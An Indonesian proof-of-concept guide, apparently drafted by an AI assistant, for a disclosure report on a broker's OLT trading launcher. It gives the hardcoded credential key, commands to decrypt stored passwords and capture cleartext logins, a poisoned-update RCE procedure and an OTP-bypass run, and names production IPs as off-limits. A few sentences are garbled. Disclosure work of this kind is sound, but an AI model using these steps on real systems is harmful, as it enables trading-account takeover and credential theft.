# Panduan Eksekusi PoC — OLT Platform
### Cara menjalankan & membuktikan setiap temuan secara nyata (lab → staging berizin)

Semua sertifikat & langkah di sini **read-only / lab-only** untuk artefak Anda.
Langkah yang memerlukan jaringan :arrow_right: **Cuma di lingkungan staging yang diberi izin tertulis** oleh PT. Semesta Indovest Sekuritas. **Jangan pernah menargetkan `202.77.118.156:8801` / `103.109.194.46:8801` produksi.**

---

## 0. Prasyarat (5 menit)

```bash
python3 --version          # >= 3.8 cukup (3.13 teruji)
pip install pefile         # kusus PoC4; PoC1/2/3/5 murni stdlib (tanpa dependency)
```
Tidak butuh .NET/Windows — semua PoC berjalan dari Linux (atau Windows dengan `python3`).

Cheat-sheet perintah cepat (lihat detail tiap PoC di bawah):

| Temuan | Perintah minimal |
|---|---|
| Kunci kredensial statis | `python3 poc01_decrypt_pisdw.py --self-test` |
| Recover `UserID\|Password` | `python3 poc01_decrypt_pisdw.py pisdw` |
| Bukti kunci di dalam biner | `python3 poc01_decrypt_pisdw.py --extract ../OLTLauncher.exe` |
| Paket login cleartext | `python3 poc02_login_packet_recon.py TRADER001 "P@ssw0rd123" II 1` |
| Manifest update tanpa hash | `python3 poc03_patch_integrity.py ../patch.dat` |
| Signature Autenticode invalid | `python3 poc04_signature_status.py` |
| OTP bypass (bukti statis) | `python3 poc05_otp_bypass.py structural` |
| OTP bypass (handshake lokal) | `python3 poc05_otp_bypass.py --otp-server --port 19001` + `python3 poc05_otp_bypass.py --local --port 19001` |

Satu file bantu `jalankan_semua.sh` memuat semua: `bash jalankan_semua.sh`.

---

## 1. MED-01 — Kredensial ter-enkripsi lemah (`pisdw`)

### 1a. Bukti kunci statis ada DI DALAM binary (langsung)

```bash
cd /home/glorys/ekse/POC_OLT
python3 poc01_decrypt_pisdw.py --extract ../OLTLauncher.exe
```
Output nyata (dari biner Anda):
```
extract : ../OLTLauncher.exe
kunci literal: b'eya!@)&)' -> md5 58b8303f3cd51b2ddc8c9ac0bdced0c6
literal ditemukan (UTF-16LE, terminator tunggal di heap):
   0x0072c876  bytes=6500790061002100400029002600290000
```
→ Ini **bukti bahwa kunci (kunci MD5 16-byte) ada di dalam produk publik**. Tanpa akses ke server apa pun.

### 1b. Recover `UserID|Password` dari file `pisdw` (reproduksi vendor)

Langkah di **mesin Windows dengan launcher terpasang** (vendor/peneliti yang diizinkan):
1. Instal launcher, centang **"Remember me"**, isi UserID/password **demo/test**, login → aplikasi menulis file `pisdw` di folder install.
2. Salin `pisdw` ke mesin analisis (mis. `/home/glorys/ekse/POC_OLT/pisdw`).
3. Jalankan:
   ```bash
   cd /home/glorys/ekse/POC_OLT
   python3 poc01_decrypt_pisdw.py pisdw
   ```
   Output (format sama yang dilakukan aplikasi `ReadIdPassFromFile` + `Split('|')`):
   ```
   file      : pisdw
   key source : hardcoded MD5(b'eya!@)&)')
   plaintext : TRADER9|demoP@ss1!
     -> UserID  = TRADER9
     -> Password = demoP@ss1!
   ```
4. **Demo tanpa pisdw asli** (pembuktian mekanisme): `--make` membuat ciphertext setara `pisdw` lalu langsung di-decrypt:
   ```bash
   python3 poc01_decrypt_pisdw.py --make TRADER9 "demoP@ss1!" /tmp/opencode/pisdw_demo
   ```
   dan `--self-test` (integritas implementasi + pin MD5):
   ```bash
   python3 poc01_decrypt_pisdw.py --self-test
   # DES KAT PASS, MD5 == 58b8303f PIN PASS, round-trip PASS
   # blok plaintext identik -> ciphertext identik  (leak pola ECB)
   ```
5. **Dampak**: file inilah yang mengisi `txtUserID`/`txtPsw` saat `ReadIdPassFromFile` → password akun trading ter-recover penuh oleh siapa pun yang memiliki launcher (produk publik) atau lewat malware/access shell (poin update, PoC3).

---

## 2. MED-02 — Login cleartext di raw TCP :8801

### 2a. Bukti layout paket (tanpa jaringan)

```bash
cd /home/glorys/ekse/POC_OLT
python3 poc02_login_packet_recon.py TRADER001 "P@ssw0rd123" II 1
```
Output nyata:
```
total packet: 52 bytes
raw hex:
  0000  34 00 00 00 01 30 54 52 41 44 45 52 30 30 31 00 4....0TRADER001.
  0010  00 00 00 00 00 00 00 00 00 00 50 40 73 73 77 30 ..........P@ssw0
  0020  72 64 31 32 33 00 00 00 00 00 00 00 00 00 31 49 rd123.........1I
  0030  49 00 00 01                                     I...

cleartext fields (no encryption applied at this layer):
  [6:26)  UserID    = TRADER001
  [26:46) Password  = P@ssw0rd123
```
Lihat sendiri di hex dump: setelah offset 0x0A terlihat `P@ssw0rd123` **sebagai teks**. Tidak ada enkripsi layer.

### 2b. Bukti di kabel (wajib: staging berizin / loopback lokal, bukan produksi)

Gunakan emulator PoC5 agar *proses nyata* bisa disadap, ditangkap dengan tcpdump:

```bash
cd /home/glorys/ekse/POC_OLT
# terminal 1 (server mock, loopback saja):
timeout 15 python3 -u poc05_otp_bypass.py --otp-server --port 19002

# terminal 2 (root) — tangkap:
sudo tcpdump -i lo -A -s0 port 19002 -c 2

# terminal 3 (klien — kirim paket persis versi klien):
python3 poc05_otp_bypass.py --local --port 19002
```
tcpdump menampilkan payload **ASCII**: `34..01 30 54 52 41 44 45 52 30 30 31 ... 50 40 73 73 77 30 72 64 …` = `0TRADER001 … P@ssw0rd123` — bukti *di jaringan* bahwa kredensial melintas polos.
(Staging asli: ganti `--port` dengan server staging + `--target host:port`, JANGAN produksi.)

**Dampak**: di Wi-Fi publik / LAN / ISP / proxy, penyadap membaca password; TCP hijack bisa memodifikasi paket order.

---

## 3. HIGH-01 — Update channel tanpa verifikasi → RCE

### 3a. Bukti manifest tanpa hash (tanpa jaringan)

```bash
python3 poc03_patch_integrity.py ../patch.dat
```
Output nyata:
```
manifest : ../patch.dat
version  : 20260909164000
entries  : 78 ; fields: file|source|dest|timestamp|size
HASH COLUMN  : NONE      SIGNATURE COLUMN: NONE
sample rows:
  CommClient.dll.gz   ... ts=20211022103220 size=658035
  ChartX.ocx.gz       ... ts=20211022103220 size=757755   (ActiveX!)

update-path crypto/hash scan on OLTLauncher.exe
  StartingUpdate               -> NO crypto/hash references
  WaitForExpectedIncomingData  -> NO crypto/hash references
  DecompressedGZFile           -> NO crypto/hash references
  msgPatchFile                 -> NO crypto/hash references
```
`size` adalah ukuran byte, **bukan checksum** — tidak ada cara mendeteksi perubahan.

### 3b. Reproduksi dampak nyata (VM terisolasi; alur sama dengan yang di binary)

Goal: membuktikan bahwa patch beracun **diproses & ditulis tanpa peringatan**.

1. Buat server palsu di loopback (atau poinkan launcher ke staging test) yang meniru protokol patch: jawab permintaan `msgPatchFile` dengan payload **binari klien**: 
   - ambil satu baris dari `patch.dat`, mis. `CommClient.dll.gz|Bin|patch/Bin|...|658035`
   - tawarkan file `.gz` itu **+ 4 byte sembarang di akhir** (tanpa mengubah `size` di manifest).
2. Jalankan launcher test di VM; pilih menu "update".
3. **Yang terjadi**: launcher memproses `patch.dat` → file dikop ke `Bin/` (melalui `DecompressedGZFile` gunzip) → **tidak ada apakah/tanda tangan yang gagal** → launcher restart. 
4. Karena DLL **imported** di `Bin/` dimuat saat launcher start (urutan dependensi DLL), file beracun itu dikomplasi & dijalankan **dengan hak pengguna trader**.
5. Catat: *tidak perlu menyerang binary* — hanya berada di jalur (MITM)/server di-poison, dan semuanya silent.

Catatan bukti untuk vendor: hampir semua serangan nyata yang menghasilkan RCE akan berjalan tanpa diam-diam — tidak ada log hash, tidak ada alert.

### 3c. Poin pendukung
- `OLTPatcher.exe` (**unsigned**) Yang menulis file — juga tidak pernah diperiksa sebelum `Process.Start` (PoC4).
- Jalur transfer = protokol raw yang sama dengan login (tanpa TLS) (PoC2).

---

## 4. HIGH-02 — Signature EV hadir tapi TIDAK memvalidasi file

### 4a. Bukti kriptografis (Linux, PoC4)

```bash
python3 poc04_signature_status.py
```
Output nyata:
```
== OLTLauncher.exe
  security dir   : RVA=0x740000 SIZE=0x2da0
  signed artifact: Authenticode PKCS#7 present
  image digest now       : 63ea64dea404daaaa187dcdad7b7ca68720331e4cd5bc75722edddc691f3c649
  image digest in signer : 13d5b3266491c306d2b4cdd24587dcb8813de7246db5f7aa3038bb1badb47b53
  VERDICT: signature DOES NOT VALIDATE current file (modified/rebuilt)
== OLTPatcher.exe
  security dir   : RVA=0x0 SIZE=0x0
  signed artifact: NONE - binary is UNSIGNED
```
Logo: binary "ditandatangani" tetapi densitas = **rumus tidak sesuai** → file **dimodifikasi setelah penandatanganan** / distribusi mati.

### 4b. Cross-check pada Windows (vendor): `Get-AuthenticodeSignature`

Pada PowerShell (admin):
```powershell
Get-AuthenticodeSignature -FilePath C:\OLT\OLTLauncher.exe |
    Select-Object Status, StatusMessage, SignerCertificate
```
Hasil yang diharapkan: **`Status` = `NotValid`** dengan pesan yang menunjuk file rusak — konsisten dengan PoC4. Ekspektasi vendor: `Valid` jika penandatanganan benar.

Catatan: signature tidak pernah ditinjaunya oleh aplikasi saat runtime; perubahan satu byte pun lolos tanpa deteksi (lihat `1-byte flip` di output PoC4 — hitung SHA-256 sebelum/sesudah: berbeda).

---

## 5. MED-03 — OTP bypass struktural

### 5a. Bukti statis (tanpa jaringan) — PoC5 structural

```bash
python3 poc05_otp_bypass.py structural
```
Output nyata (ringkas):
```
(a) HTTPS path enforces OTP (strings present in the binary):
       'auth/login'   'auth/otp'   'otp'   'Bearer'   'Use Authentication'
(c) msgLoginToLB packet layout (+ explicit field inventory):
       [6:26)  USERNAME   20B b'TRADER001           '
       [26:46) PASSWORD   20B b'P@ssw0rd123         '
       [51)    type 1..4      b'1'
(d) conclusion: ... NO OTP/token/session field -> 2FA bypassable via this path.
```

### 5b. Bukti handshake lokal (loopback) — PoC5 `--otp-server` + `--local`

```bash
cd /home/glorys/ekse/POC_OLT
# terminal 1 (server mock):
timeout 15 python3 -u poc05_otp_bypass.py --otp-server --port 19001
# terminal 2 (klien):
python3 poc05_otp_bypass.py --local --port 19001
```
Output nyata terminal 2:
```
== klien -> paket msgLoginToLB (52 byte) ==
== respons server ==
  b'251 |Log In Successfully|'
== analisis ==
  server menjawab LOGIN tanpa pernah meminta OTP;
  tidak ada field OTP/token dalam paket -> OTP bypass terkonfirmasi (lab).
```
Server mock mencatat: username diterima, login dijawab OK, **tidak pernah kirim tantangan OTP**.

### 5c. Reproduksi dampak di staging berizin (umum untuk semua temuan jaringan)

1. Aktifkan OTP pada jalur HTTPS (`auth/otp`) di staging test → buktikan klien OTP normal jalan (2FA aktif).
2. Arahkan klien **raw TCP :8801** staging dengan `--target <host>:port`:
   ```bash
   python3 poc05_otp_bypass.py --local --target 10.0.0.5:8801 --user TESTOWER --pass "P@ssw0rd123" --broker II --type 1
   ```
   → login diterima **tanpa OTP**.
3. (*opsional*) tangkap dengan `tcpdump` untuk rekaman Wireshark sebagai lampiran laporan.

> **Pengaman**: `--target` non-lokal menampilkan peringatan keras. Jalankan hanya di IP staging milik vendor. Jangan pernah terhadap `202.77.118.156:8801`.

---

## 6. Demo cepat hasil lengkap (untuk lampiran penyerahan)

Jalankan satu perintah (mencetak semuanya + ringkasan):

```bash
bash jalankan_semua.sh
```
Output: banner per PoC, status PASS/FAIL tiap temuan, dan ringkasan matriks (per PoC). 
Cocok untuk demonstrasi langsung kepada tim security vendor, atau lampiran laporan `LAPORAN_KERENTANAN_OLT.md` + `README_POC.md`.

---

## 7. Checklist penyerahan (responsible disclosure)

1. [ ] Jalankan semua PoC read-only di mesin analisis.
2. [ ] Untuk PoC1: minta/sediakan file `pisdw` test dan tunjukkan recovery.
3. [ ] Untuk PoC2/3/5: reproduksi jaringan **hanya di staging berizin** (VM terisolasi).
4. [ ] Cross-check PoC4 di Windows dengan `Get-AuthenticodeSignature`.
5. [ ] Kirim paket ke tim security / kontak resmi: `LAPORAN_KERENTANAN_OLT.md`, `POC_OLT/` (5 PoC + README + panduan), lampiran buru PoC4-`tcpdump`.
6. [ ] Jangan mengungkap detail di publik sebelum fix & koordinasi vendor.

> Kalau butuh penjelasan tambahan soal satu PoC atau ingin versi Windows (cmd/PowerShell) dari salah satu skrip — bilang saja.